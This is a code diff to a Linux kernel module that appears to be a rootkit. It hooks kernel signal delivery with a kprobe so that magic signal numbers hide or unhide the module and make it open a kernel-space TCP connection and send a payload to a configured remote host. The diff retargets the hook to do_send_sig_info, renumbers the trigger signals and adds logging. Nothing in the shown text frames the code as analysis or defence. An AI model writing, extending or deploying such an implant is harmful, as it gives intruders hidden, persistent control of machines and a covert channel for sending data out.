@@ -1,5 +1,6 @@
 #include <linux/module.h>
 #include <linux/kprobes.h>
+#include <linux/ptrace.h>
 #include <linux/sched.h>
 #include <linux/uaccess.h>
 
@@ -12,11 +13,12 @@
 #include <linux/in.h>
 #include <net/sock.h>
 
-#define SIGALWRECV 50
-#define SIGREMRECV 51
-#define SIGHIDEMOD 52
-#define SIGUNHIDEM 53
-#define SIGSENDNET 54
+
+#define SIGALWRECV 51
+#define SIGREMRECV 52
+#define SIGHIDEMOD 53
+#define SIGUNHIDEM 54
+#define SIGSENDNET 55
 
 #define IOCTL_IP    0x100
 #define IOCTL_PORT  0x200
@@ -43,7 +45,7 @@ static struct list_head *save_previous_mod;
 static int mod_hide     = 0;
 
 static struct kprobe kp = {
-    .symbol_name = "__x64_sys_kill",
+    .symbol_name = "do_send_sig_info",
 };
 
 static const struct file_operations fops = {
@@ -165,14 +167,14 @@ static void kSIGSENDNET(void){
     int ret;
 
     if (!rHost || rPort == 0 || !payload) {
-        pr_err("kSIGSENDNET: missing parameters\n");
+        pr_info("kSIGSENDNET: missing parameters\n");
         return;
     }
 
     pr_info("kSIGSENDNET: Connecting to %s:%d\n", rHost, rPort);
     ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (ret < 0 || !sock) {
-        pr_err("kSIGSENDNET: sock_create failed\n");
+        pr_info("kSIGSENDNET: sock_create failed\n");
         return;
     }
 
@@ -183,7 +185,7 @@ static void kSIGSENDNET(void){
 
     ret = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0);
     if (ret < 0) {
-        pr_err("kSIGSENDNET: connect failed\n");
+        pr_info("kSIGSENDNET: connect failed\n");
         sock_release(sock);
         return;
     }
@@ -200,7 +202,7 @@ static void kSIGSENDNET(void){
 
     ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
     if (ret < 0) {
-        pr_err("kSIGSENDNET: kernel_sendmsg failed\n");
+        pr_info("kSIGSENDNET: kernel_sendmsg failed\n");
     } else {
         pr_info("kSIGSENDNET: Sent %d bytes\n", ret);
     }
@@ -212,24 +214,32 @@ static void kSIGSENDNET(void){
 static int SIGCATCH(struct kprobe *p, struct pt_regs *regs)
 {
     int ret = 0;
-    switch ((int)regs->si) {
+    pid_t pid = regs->si;
+    int signalno = regs->di;
+
+    pr_info("SIGCATCH: signal %d | PID %d\n", signalno, pid);
+    switch (signalno) {
         case SIGALWRECV:
+            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
             ret = kSIGALWRECV();
             break;
         case SIGREMRECV:
+            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
             kSIGREMRECV();
             break;
         case SIGHIDEMOD:
+            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
             kSIGHIDEMOD();
             break;
         case SIGUNHIDEM:
+            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
             kSIGUNHIDEM();
             break;
         case SIGSENDNET:
+            pr_info("SIGCATCH: signal %d\n", (int)regs->si);
             kSIGSENDNET();
             break;
         default:
-            pr_err("SIGCATCH: Unknown signal %d\n", signal);
             break;
     }
 
